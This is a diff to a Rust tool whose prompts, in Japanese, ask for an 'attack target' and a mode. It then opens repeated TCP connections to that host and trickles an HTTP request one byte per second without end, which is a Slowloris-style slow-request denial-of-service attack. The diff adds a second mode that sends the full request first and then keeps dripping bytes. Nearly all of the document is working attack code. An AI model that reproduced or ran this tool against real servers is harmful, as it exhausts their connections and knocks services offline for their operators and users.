@@ -7,12 +7,13 @@ use std::{io::Write, time::Duration};
 use tokio::{
     io::{AsyncReadExt, AsyncWriteExt, BufStream},
     sync::RwLock,
-    time::{sleep, Instant},
+    time::sleep,
 };
 
 struct Session {
     http_request: Vec<u8>,
     connect: String,
+    mode: u8,
     errors: RwLock<u8>,
 }
 
@@ -21,6 +22,7 @@ impl Session {
         Session {
             http_request: b"GET / HTTP/1.1\r\nConnection: keep-alive\r\n".to_vec(),
             connect: String::new(),
+            mode: 0,
             errors: RwLock::const_new(0),
         }
     }
@@ -32,12 +34,27 @@ lazy_static! {
 
 #[tokio::main]
 async fn main() {
-    print!("攻撃先: ");
+    let mut session = SESSION.write().await;
+
+    println!("モードを選んでください");
+    println!("1: 推奨\n2: 1がうまく行かないとき用");
+    print!("> ");
+    std::io::stdout().flush().unwrap();
+    let mut mode = String::new();
+    std::io::stdin().read_line(&mut mode).unwrap();
+    let mode: u8 = mode.trim().parse().unwrap();
+    if 2 < mode {
+        panic!("変な値が入力されたようです");
+    } else {
+        session.mode = mode;
+    }
+
+    println!("攻撃先を指定してください");
+    print!("> ");
     std::io::stdout().flush().unwrap();
     let mut connect = String::new();
     std::io::stdin().read_line(&mut connect).unwrap();
     let mut connect = connect.trim().to_string();
-    let mut session = SESSION.write().await;
     session.http_request.extend(b"Host: ");
     session.http_request.extend(connect.as_bytes());
     session.http_request.extend(b"\r\n\r\n");
@@ -64,7 +81,7 @@ async fn main() {
 async fn attack() {
     let session = SESSION.read().await;
     loop {
-        let mut connect = match tokio::net::TcpStream::connect(&session.connect).await {
+        let connect = match tokio::net::TcpStream::connect(&session.connect).await {
             Ok(o) => BufStream::new(o),
             Err(_) => {
                 let mut errors = session.errors.write().await;
@@ -74,20 +91,30 @@ async fn attack() {
                 return;
             }
         };
+        let (mut read, mut write) = tokio::io::split(connect);
 
-        for i in 0..session.http_request.len() {
-            let _ = connect.write_all(&session.http_request[i..i + 1]).await;
-            if connect.flush().await.is_err() {
-                break;
-            };
-            sleep(Duration::from_secs(1)).await;
+        let receive = tokio::spawn(async move {
+            let mut buffer = [0_u8];
+            loop {
+                if read.read_exact(&mut buffer).await.is_err() {
+                    break;
+                }
+            }
+        });
+
+        if session.mode == 2 {
+            let _ = write.write_all(&session.http_request).await;
         }
 
-        let mut buffer = [0_u8];
-        loop {
-            if connect.read_exact(&mut buffer).await.is_err() {
-                break;
+        'outer: loop {
+            for i in 0..session.http_request.len() {
+                let _ = write.write_all(&session.http_request[i..i + 1]).await;
+                if write.flush().await.is_err() {
+                    break 'outer;
+                };
+                sleep(Duration::from_secs(1)).await;
             }
         }
+        receive.abort();
     }
 }
